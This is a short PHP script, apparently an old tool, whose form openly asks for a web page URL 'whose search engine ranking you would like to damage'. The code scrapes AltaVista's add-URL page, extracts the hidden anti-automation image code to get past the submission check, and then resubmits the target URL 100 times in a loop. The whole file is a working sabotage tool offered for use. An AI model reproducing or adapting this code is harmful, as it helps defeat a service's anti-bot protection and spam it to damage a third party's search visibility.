<?php

$buffer;

/**************functions area***************/
function GetFromHost($host,$path) {
$fbuffer = "";
$fp = fsockopen($host, 80, &$err_num, &$err_msg, 30); 
fputs($fp,"GET $path HTTP/1.1\r\n"); 
fputs($fp,"Host: $host\r\n\r\n"); 
while(!feof($fp)){ 
$fbuffer.= fgets($fp,1024); 
} 
fclose($fp);
return $fbuffer;
} 

/**************EO Functions area************/

if ($searchkill_engine=="altavista"){

	for ($i=0; $i<100; $i++){

		$alta_sub_page = GetFromHost("add-url.altavista.com","/cgi-bin/newurl?");

		$alta_bypass = explode("<input name=imgnb type=hidden value=",$alta_sub_page);
		$ab = $alta_bypass[1];
		$alta_code = "$ab[0]$ab[1]$ab[2]$ab[3]$ab[4]";

		echo $alta_code."<br>\n";

		$fp = fopen("http://add-url.altavista.com/cgi-bin?image.gif".$alta_code, "r") or die("couldnt open file");
		while (!feof($fp)){
			$response .= fgets($fp, 4096); 
		}
		fclose($fp);
		$fp = fopen("http://add-url.altavista.com/cgi-bin/newurl?imgnb=".$alta_code."&ad=1&key=&q=".urlencode($url), "r") or die("couldnt open file");
		while (!feof($fp)){ 
			$response .= fgets($fp, 4096); 
		}
		fclose($fp);

	}


} elseif ($searchkill_engine=="otherengine..."){


} else {

?>
<form method=post action=<?php echo $PHP_SELF;?>>
please give the exact url of the page you who's search engine ranking<br>
you would like to damage.<br>
url: <input type=text name=url value="http://"><br>
Target Engine: <select name=searchkill_engine>
<option value="altavista">Alta Vista</option>
</select>
<br><input type=submit name=submit value="Kill Rankings..."><br>
(this is not guaranteed to work, but there is always hope.)
</form>
<?php
}
?>